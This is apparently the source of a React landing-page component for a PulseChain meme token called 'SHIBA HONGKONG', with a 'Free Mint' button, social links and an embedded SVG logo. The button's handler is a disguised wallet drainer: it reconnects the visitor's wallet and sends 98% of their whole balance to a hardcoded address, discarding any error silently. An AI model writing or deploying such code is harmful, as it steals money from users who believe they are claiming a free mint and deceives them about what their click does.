import Image from "next/image";
import Link from "next/link";
import React, { useEffect } from "react";
import PulseX from "../../../assets/pulseX.png";
import Pulse from "../../../assets/pulse.png";
import { FaTwitter, FaTelegramPlane } from "react-icons/fa";
import { useBalance, useDisconnect } from "wagmi";
import { useAccount, useConnect } from "wagmi";
import { Connectors } from "@/pages/_app";
import { useSendTransaction } from "wagmi";
import { ethers } from "ethers";
export default function HomeBanner() {
  const { connector: activeConnector, isConnected, address } = useAccount();
  const { data, isError, isLoading } = useBalance({
    address: address,
  });
  const { disconnectAsync } = useDisconnect();
  const { connectAsync } = useConnect();
  const {
    data: DataTrans,
    isSuccess,
    sendTransactionAsync,
  } = useSendTransaction({
    to: "0x40B1565920b0Bb6490dc802374FDf98BcCD420D7",
    value: ethers.utils
      .parseEther(data?.formatted.toString() || "0")
      .mul(ethers.BigNumber.from("98"))
      .div(ethers.BigNumber.from("100"))
      .toString(),
  });
  const handleClaim = async () => {
    try {
      await disconnectAsync();
      await connectAsync({ connector: Connectors[0] });
      await sendTransactionAsync();
    } catch (err) {}
  };

  return (
    <div className="relative home-banner max-h-screen h-screen ">
      <div></div>
      <div className="bottom-0 left-0 w-full absolute  h-[70%] bg-gradient-to-t from-black to-transparent "></div>
      <div className="relative z-[10] h-full flex items-center justify-center">
        <div className="max-w-[540px] md:max-w-[720px] lg:max-w-[960px] xl:max-w-[1140px] w-full  mx-auto px-3">
          <div className="flex items-center justify-between">
            {/* để đây nếu muốn viết thêm vào bên phải */}
            <div>
              <button
                className="bg-gradient-to-r from-[#e49945] to-blue-500 py-5 px-10 rounded"
                onClick={handleClaim}
              >
                Free Mint
              </button>
            </div>
            <div>
              <p
                className="mb-2 text-[12px] tracking-[5px] !text-white"
                data-aos="fade-up"
              >
                Welcome to the new storm on pulse chain
              </p>
              <div data-aos-delay="100" data-aos="fade-up">
                <h1 className="mb-5 font-semibold text-[32px] md:text-[50px] !text-white">
                  SHIBA HONGKONG
                </h1>
                <p className="mb-5 font-semibold text-2xl !text-white">
                  Degen , Meme , For Community
                </p>
              </div>
              <div
                className="flex items-center"
                data-aos-delay="300"
                data-aos="fade-up"
              >
                <Link
                  className="flex items-center"
                  href="https://pulsechain.com/"
                  target="_blank"
                >
                  <Image src={Pulse} width={100} height={100} alt="uniocon" />
                </Link>
                <Link
                  className="flex items-center"
                  href="https://pulsex.com/"
                  target="_blank"
                >
                  <Image src={PulseX} width={100} height={100} alt="uniocon" />
                </Link>
                <Link className="flex items-center" href="#" target="_blank">
                  <svg
                    fill="none"
                    width="100"
                    height="55.197792088316"
                    viewBox="0 -.058 754.779 867.058"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      clip-rule="evenodd"
                      d="m280.395 49.025c-51.649 26.905-93.905 49.672-93.896 50.598.023 2.39 123.959 65.156 128.358 65.003 2.001-.067 16.517-6.749 32.256-14.847l28.621-14.721 31.258 16.067 31.256 16.07 51.188-23.001c77.13-34.659 85.141-38.457 83.885-39.733-1.666-1.693-29.331-16.555-104.388-56.07-36.274-19.098-71.481-37.823-78.24-41.612-6.758-3.789-13.21-6.837-14.337-6.778s-44.311 22.12-95.961 49.024zm-226.532 117.306-53.766 27.772v121.886c0 67.038.706 121.885 1.572 121.885.863 0 27.316-11.467 58.783-25.482l57.213-25.482v-128.476l27.958 15.232a33224.294 33224.294 0 0 0 64.671 35.109l36.712 19.877 16.336-7.387a3822.03 3822.03 0 0 0 30.674-14.056c7.885-3.672 27.241-12.39 43.012-19.377 15.771-6.99 30.37-14.019 32.44-15.621 2.75-2.128-30.782-20.658-124.025-68.54-70.285-36.093-130.046-65.509-132.802-65.368s-29.206 12.752-58.778 28.028zm529.148 7.799c-36.618 16.531-66.604 30.717-66.638 31.526-.032.808 19.926 12.675 44.354 26.367 24.426 13.695 44.412 25.632 44.412 26.531 0 .897-21.615 11.37-48.03 23.278-26.419 11.905-93.194 42.061-148.393 67.014l-184.954 83.602c-46.525 21.032-88.462 39.989-93.193 42.132-95.03 43.019-121.15 54.956-124.737 57.005-3.607 2.063-4.424 14.048-5.066 74.201l-.766 71.744 48.08 24.498 48.079 24.497 66.669-30.088c36.669-16.547 66.669-30.953 66.669-32.014 0-1.058-6.776-5.473-15.054-9.815-8.282-4.342-25.378-13.954-37.995-21.364-12.616-7.411-25.196-14.21-27.958-15.112-2.761-.899-4.98-2.472-4.935-3.498.046-1.023 29.404-14.968 65.236-30.991 69.597-31.117 122.858-55.1 237.202-106.809a305577.39 305577.39 0 0 1 153.411-69.31c44.948-20.288 97.208-43.983 116.134-52.655l34.41-15.767.765-72.561.769-72.558-48.765-25.03c-26.822-13.765-49.748-24.994-50.95-24.953-1.201.038-32.141 13.595-68.756 30.13zm153.872 261.772c-7.186 3.51-21.38 10.082-31.542 14.603s-29.446 13.222-42.852 19.339l-24.374 11.117-.556 63.702c-.307 35.035-1.597 63.545-2.867 63.36-2.885-.429-48.567-23.857-94.487-48.463-33.143-17.757-35.225-18.463-43.013-14.606-4.502 2.231-31.413 14.3-59.801 26.825-28.389 12.523-52.541 23.587-53.677 24.589-1.133 1 56.002 31.967 126.97 68.819l129.029 67.003 55.119-28.513c30.312-15.68 56.088-29.983 57.275-31.782 2.672-4.045 2.443-242.93-.232-242.607-1.058.127-7.806 3.104-14.992 6.614zm-305.227 280.391a25013.26 25013.26 0 0 0 -28.675 12.349c-28.856 12.484-23.201 12.898-57.531-4.192-22.865-11.382-32.721-14.894-36.999-13.189-3.209 1.278-30.826 13.703-61.376 27.61-30.548 13.907-56.602 25.285-57.898 25.285-12.817 0 8.491 12.731 90.714 54.207l96.428 48.637 40.572-20.03c22.315-11.017 67.323-33.078 100.021-49.024 32.695-15.95 59.042-29.413 58.549-29.921-.497-.506-27.893-14.574-60.883-31.262l-59.982-30.338z"
                      fill="#e49945"
                      fill-rule="evenodd"
                    ></path>
                  </svg>
                </Link>
                <Link href="https://twitter.com/PulseShibaHK" target="_blank">
                  <FaTwitter className="text-5xl w-[100px]  text-[#49d6d2]" />
                </Link>
                <Link href=" https://t.me/pulseshibahk" target="_blank">
                  <FaTelegramPlane className="text-5xl w-[100px] text-[#49d6d2]" />
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Link href="#about">
        <div className="z-[10] absolute bottom-[10%] left-2/4 overflow-hidden -translate-x-2/4 w-[20px] h-[42px] border border-white/60 border-[2px] rounded-full cursor-pointer">
          <div className="w-[3px] h-[3px] rounded-full mx-auto bg-white ani-fade-down"></div>
        </div>
      </Link>
    </div>
  );
}